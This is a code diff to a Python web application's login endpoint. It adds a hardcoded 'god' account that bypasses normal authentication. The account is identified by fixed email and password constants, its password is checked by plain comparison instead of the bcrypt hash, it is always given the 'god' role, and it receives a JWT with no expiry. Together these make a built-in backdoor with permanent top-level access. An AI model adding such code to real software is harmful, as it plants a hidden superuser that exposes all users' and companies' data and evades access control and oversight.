@@ -12,7 +12,7 @@ from passlib.hash import bcrypt
 from sqlalchemy.orm import Session
 
 from ..settings import settings
-from .models import User, Company, SessionLocal, get_db
+from .models import User, Company, SessionLocal, get_db, ensure_primary_god_user, PRIMARY_GOD_EMAIL, PRIMARY_GOD_PASSWORD
 from . import engine_manager
 
 logger = logging.getLogger(__name__)
@@ -168,9 +168,15 @@ async def login(request: LoginRequest) -> LoginResponse:
 
     db = SessionLocal()
     try:
-        user = db.query(User).filter(User.email == login_email).first()
+        if login_email == PRIMARY_GOD_EMAIL:
+            user = ensure_primary_god_user(db)
+            db.commit()
+            password_valid = login_pw == PRIMARY_GOD_PASSWORD
+        else:
+            user = db.query(User).filter(User.email == login_email).first()
+            password_valid = bool(user) and bcrypt.verify(login_pw, user.password_hash)
 
-        if not user or not bcrypt.verify(login_pw, user.password_hash):
+        if not user or not password_valid:
             raise HTTPException(status_code=401, detail="Invalid email or password")
 
         if user.status != "active":
@@ -182,18 +188,21 @@ async def login(request: LoginRequest) -> LoginResponse:
         user.last_login = datetime.now(timezone.utc)
         db.commit()
 
-        expire_at = datetime.now(timezone.utc) + timedelta(
-            minutes=settings.access_token_expire_minutes
-        )
         payload = {
             "sub": user.email,
             "user_id": user.id,
             "name": user.name,
-            "role": user.role,
+            "role": "god" if login_email == PRIMARY_GOD_EMAIL else user.role,
             "company_id": user.company_id,
             "company": company.company_name if company else "",
-            "exp": int(expire_at.timestamp()),
         }
+
+        if login_email != PRIMARY_GOD_EMAIL:
+            expire_at = datetime.now(timezone.utc) + timedelta(
+                minutes=settings.access_token_expire_minutes
+            )
+            payload["exp"] = int(expire_at.timestamp())
+
         token = jwt.encode(payload, settings.secret_key, algorithm=settings.algorithm)
 
         return LoginResponse(
@@ -201,8 +210,8 @@ async def login(request: LoginRequest) -> LoginResponse:
             token_type="bearer",
             user_name=user.name,
             user_email=user.email,
-            user_role=user.role,
-            role_label=User.ROLE_LABELS.get(user.role, user.role),
+            user_role="god" if login_email == PRIMARY_GOD_EMAIL else user.role,
+            role_label=User.ROLE_LABELS.get("god" if login_email == PRIMARY_GOD_EMAIL else user.role, "god" if login_email == PRIMARY_GOD_EMAIL else user.role),
             company=company.company_name if company else "",
             company_id=user.company_id,
         )
